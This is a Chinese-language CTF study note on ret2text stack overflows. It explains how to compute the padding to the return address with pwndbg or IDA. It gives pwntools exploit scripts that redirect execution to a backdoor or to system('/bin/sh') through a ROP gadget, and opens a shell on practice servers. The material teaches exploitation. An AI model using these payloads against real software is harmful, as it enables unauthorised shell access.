## 总体流程概述
我们的 `ret2text` 漏洞大体上可以分为我们的两个部分，第一个部分是构造我们的垃圾数据，第二个部分是跳转到我们的 `shellcode`,因此，我们的 `ret2text`,也可以理解是一种 `ret2shellcode` 的漏洞。

## 构造垃圾数据：
第一步：找到我们溢出的目标变量距离我们的栈底指针的位置差是多少，我们记为 $dx_{1}$
第二步：我们实际要构造的长度，就是我们的 $dx_{1}+4(32位),8(64位)$,也就是说，我们的最终构造出来的数据的长度是我们的 $dx_{1}+4(32位)，8(64位)$。这里是因为，我们要最后修改的是我们的返回地址。

具体操作：
第一步：用我们的 IDA 或者我们的 pwndbg 来进行我们的反汇编，我们这里采用我们的 pwndbg 演示
![[Pasted image 20231122223041.png]]

第二步：我们进入后，直接运行我们的程序，就是 run
![[Pasted image 20231122223116.png]]

然后我们就能得到下面的界面：
![[Pasted image 20231122223325.png]]
![[Pasted image 20231122223137.png]]

我们黄色箭头指向的地方就是我们正在执行的指令，`register` 界面存储了我们当前运行位置寄存器的值，其中，我们的 `EIP` 就是我们**当前运行程序的位置**，`ESP` 和 `EBP` 表示我们的栈的地址，两个相邻很近，但是值都很大，因为他们在我们**程序的高位**

`DISASM` 表示我们当前运行程序的大致位置，

`stack` 表示我们函数栈的位置，注意，在 GDB 中，函数的栈是反着来的，

`BACKTRACE` 表示我们的函数调用流程

第二步：接下来，我们输入 `n` 进行步过，找到我们目标函数的位置。我们再使用 `s` 执行我们的单个函数
![[Pasted image 20231122223713.png]]

第三步：对于我们的 `gets` 漏洞，我们需要计算我们需要填充多少空白数据，填充什么关键数据，在这里，我们的空白数据需要用我们 `ebp` 高一位就是我们的**目标攻击对象**，我们于是就需要 `27c-268`,即 20 个字节的内容，然后我们的最后位置填写我们的地址
![[Pasted image 20231122224118.png]]
或者，我们也可以在 IDA 中直接得到：
![[Pasted image 20231122225001.png]]
注意：**在 IDA 中得到的要额外添加一个字节 的数据，来填充我们的 ebp**

## 构造shellcode
### 一、shellcode 已经给出

找到我们 C 程序中的后门函数，把我们的返回地址改为我们的后门函数所在的地址，然后我们就可以直接用我们的 shell 了，
![[Pasted image 20231122224529.png]]

找到目的地址：我们在 IDA 中双击目标函数
![[Pasted image 20231122225318.png]]
然后我们的起始地址就是我们的 `0x8048522`

我们就可以构造我们的 `payload` 如下：
```python
from pwn import *
io=remote("114.514.1.19",1919)
io.recvline();
payload=b'a'*20+p32(addr)
```
![[Pasted image 20231122225420.png]]

#### 特殊情况：
如果我们确认我们的 payload 正确的情况下，没有得到想要的结果，那么我们这个时候，需要去考虑我们是不是我们的堆栈没有平衡，这个时候，我们就需要参考我们的[[栈对齐]]的方法来修改



### 有 system 函数, 但是缺少参数
这个时候，我们的操作就应该是：直接找到我们 `system` **函数的对应地址**是多少，这一步我们可以通过我们的 ida 或者是或者是我们的 `elf.symbols["system"]` 来找到我们的结果。

之后，我们再去**修改我们 system 函数的对应参数**，我们这里，我们需要根据我们的对应的操作系统的格式去进行相关的操作:
如果是 64 位，我们就去修改我们的 `rdi` 的参数，如果是我们的 32 位，我们就直接在我们的栈上写我们的地址即可。
**这里，我们还需要注意一个细节，就是我们的寄存器内容到底是放到哪一个里面，需要根据我们实际得到的 pop 指令指令来决定。**


六十四位：
```python
from pwn import *

context(log_level = 'debug')

proc_name = './level2_x64'
p =process(proc_name)
p = remote('node3.buuoj.cn', 25838)
elf = ELF(proc_name)
system_addr = elf.sym['system']
bin_sh_str = 0x600a90
pop_rbi_ret = 0x4006b3
payload = 'a'.encode() * (0x80 + 8) + p64(pop_rbi_ret) + p64(bin_sh_str) + p64(system_addr)
p.sendline(payload)
p.interactive()

```
三十二位：
```cpp
from pwn import *
io = process("./level2")
# io = remote("node4.buuoj.cn",26959)
elf = ELF("./level2")
system_addr = elf.symbols["system"]
bin_sh_addr = 0x0804a024
payload = b"a"*(0x88+0x04) + p32(system_addr) + p32(0) + p32(bin_sh_addr)
io.sendlineafter("Input:\n",payload)
io.interactive()

```